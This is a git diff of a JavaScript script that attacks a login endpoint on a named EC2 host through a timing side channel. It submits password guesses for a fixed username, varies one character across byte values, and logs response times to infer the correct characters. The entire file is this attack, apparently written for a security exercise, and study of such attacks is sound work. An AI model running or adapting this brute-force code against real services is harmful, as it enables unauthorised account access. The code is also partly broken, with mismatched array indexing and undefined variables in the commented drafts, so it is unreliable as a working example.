@@ -1,48 +1,65 @@
 var url = 'https://ec2-54-188-28-123.us-west-2.compute.amazonaws.com:8080/';
 var uname = "au597939";
 
-// var pass = "Password";
-// var uname = "au597939";
+let startPass = "iiiiiiii";
+let repl = 2;
 
-// var formData = new FormData();
-// formData.append('username', uname);
-// formData.append('password', pass);
+var tryPromises = [];
+var tryTiming = [];
 
-// fetch(url, {
-//     method: 'POST',
-//     body: formData
-// }).then(res => {
-//     var ok = res.ok;
-//     if (ok) {
-//         console.log("Authenticated correctly");
-//     } else {
-//         console.log("Not authenticated!");
-//     }
+let k = 0;
+
+// for (let i = 0x0021; i < 0x00ff; i++) {
+//   for (let j = 0; j < repl; j++) {
+//     tryTiming.push([String.fromCodePoint(i), []]);
+//     let tryPass = startPass.slice(0,k) + String.fromCodePoint(i) + startPass.slice(k + 1);
+//     let formData = new FormData();
+//     formData.append('username', uname);
+//     formData.append('password', tryPass);
+//     let startTime = new Date().getTime();
+    
+//     reqPromise.then(() => {
+
+//     })
+//     fetch(url, {
+//       method: 'POST',
+//       body: formData
+//     }).then(res => {
+//       tryTiming[i][1].push(new Date().getTime() - startTime);
+//     });
+//     tryPromises.push(promise);
+//   }
+// }
+
+// Promise.all(tryPromises).then(() => {
+//   let mappedTiming = tryTiming.map(arr => [arr[0], arr[1].reduce((prev, curr) => prev + curr) / arr[1].length])
+//   console.log(mappedTiming);
 // });
 
-var log = [];
-let pass = "Password";
-let wrongChar = "i";
-let repl = 100;
-var wrongPromises = [];
-var wrongTiming = [];
-for (let i = 0; i < 8; i++) {
-    wrongTiming.push([]);
-    for (let j = 0; j < repl; j++) {
-        let tamperedPass = pass.slice(0,i) + wrongChar + pass.slice(i);
-        let formData = new FormData();
-        formData.append('username', uname);
-        formData.append('password', tamperedPass);
-        let startTime = new Date().getTime();
-        wrongPromises.push(fetch(url, {
-          method: 'POST',
-          body: formData
-        }).then(res => {
-          wrongTiming[i].push(new Date().getTime() - startTime);
-        }));
+function tryPass(startIndex, maxInd, replInd, replMax) {
+  tryTiming.push([String.fromCodePoint(startIndex), []]);
+  let fuzzyPass = startPass.slice(0,k) + String.fromCodePoint(startIndex) + startPass.slice(k + 1);
+  let formData = new FormData();
+  formData.append('username', uname);
+  formData.append('password', fuzzyPass);
+  let startTime = new Date().getTime();
+  return fetch(url, {
+    method: 'POST',
+    body: formData
+  }).then(res => {
+    tryTiming[startIndex][1].push(new Date().getTime() - startTime);
+    if (startIndex + 1 < maxInd) {
+      if (replInd + 1 < replMax) {
+        return tryPass(startIndex, maxInd, replInd + 1, replMax);
+      } else {
+        return tryPass(startIndex + 1, maxInd, 0, replMax);
+      }
+    } else {
+      return Promise.resolve(tryTiming);
     }
+  });
 }
 
-Promise.all(wrongPromises).then(() => {
-  console.log(wrongTiming.map(arr => arr.reduce((prev, curr) => prev + curr) / arr.length));
+tryPass(0x0000, 0x00ff, 0, 2).then(res => {
+  console.log(res);
 });
